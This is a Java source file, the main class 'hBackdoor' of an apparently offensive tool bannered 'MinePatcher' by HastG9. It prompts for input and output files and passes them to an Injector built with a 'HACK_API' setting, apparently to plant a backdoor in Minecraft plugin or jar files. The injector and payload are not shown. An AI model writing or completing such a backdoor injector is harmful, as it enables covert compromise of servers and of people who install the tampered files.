package ru.hastg9;

import java.util.Scanner;

public class hBackdoor {

    public static void main(String[] args) {
        System.setProperty("file.encoding", "UTF8");
        System.setProperty("defaultCharset", "UTF8");

        printLogo();

        Scanner scanner = new Scanner(System.in);

        Injector injector = new Injector(Settings.HACK_API);

        System.out.print("Input file/dir: ");
        String input = scanner.next();
        System.out.print("Output file/dir: ");
        String output = scanner.next();
        System.out.println("");

        injector.inject(input, output);
    }

    public static void printLogo() {
        System.out.println("\n░█▀▄▀█ ─▀─ █▀▀▄ █▀▀ ░█▀▀█ █▀▀█ ▀▀█▀▀ █▀▀ █──█ █▀▀ █▀▀█ \n" +
                "░█░█░█ ▀█▀ █──█ █▀▀ ░█▄▄█ █▄▄█ ──█── █── █▀▀█ █▀▀ █▄▄▀ \n" +
                "░█──░█ ▀▀▀ ▀──▀ ▀▀▀ ░█─── ▀──▀ ──▀── ▀▀▀ ▀──▀ ▀▀▀ ▀─▀▀");
        System.out.println("by HastG9\n");
        System.out.println("Youtube: https://www.youtube.com/c/HastG9\n");
    }

}
